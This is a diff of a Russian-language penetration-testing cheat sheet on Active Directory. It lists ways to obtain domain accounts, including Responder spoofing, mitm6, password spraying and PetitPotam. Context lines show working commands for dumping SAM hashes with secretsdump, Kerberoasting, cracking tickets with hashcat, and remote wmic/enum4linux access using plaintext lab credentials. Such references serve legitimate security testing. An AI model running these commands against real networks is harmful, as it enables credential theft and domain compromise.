@@ -182,14 +182,15 @@ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 ## Active Directory
 
 Как получить учётную запись в AD:
-[  ] Прослушивание траффика
-[  ] Password spray
-[  ] LLNR, WPAD, spoof responder
-[  ] Ipv6 attack mitm6
-[  ] Mitm + DNS fake+ Portal fake = intercepter-ng
-[  ] Поиск общедоступных шар crakmapexec, WinGrep
-[  ] Поиск серверов с уязвимостью
-[  ] Wiki, confluence, jira
+- Прослушивание траффика
+- Password spray
+- LLNR, WPAD, spoof responder
+- Ipv6 attack mitm6
+- Mitm + DNS fake+ Portal fake = intercepter-ng
+- Поиск общедоступных шар crakmapexec, WinGrep
+- Поиск серверов с уязвимостью
+- Поиск секретов Wiki, confluence, jira
+- Petitpotam
 
 
 **Поиск Gpp** 
@@ -203,6 +204,9 @@ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -dc-ip 172.16.1.
 [L] ldapsearch -LLL -x -H ldap://172.16.1.1 -D "capitan@trust.localhost" -W -b "dc=trust,dc=localhost" "servicePrincipalName=*" sAMAccountName servicePrincipalName
 hashcat -m 13100 --force <TGSs_file> <passwords_file>
 for i in $(find -name '*.txt'); do hashcat -m 13100 --force tgt_ticket.txt "$i"; done >> /tmp/brute_tgt.log
+```
+**Petitpotam**
+```
 ```
 
 **FTP**
@@ -224,7 +228,7 @@ wmic /node:alloc.trust.localhost /user:'trust.localhost\shut' /password:nik123 s
 enum4linux -a -u shut -p nik123 -w trust.localhost alloc.trust.localhost
 ```
 
-Монтирование шары:
+## Монтирование шары:
 ```
 sudo apt install cifs-utils && sudo mkdir /mnt/win_share && sudo mount -t cifs -o username=shut //nas.trust.localhost/WORK/logs /mnt/win_share
 ```
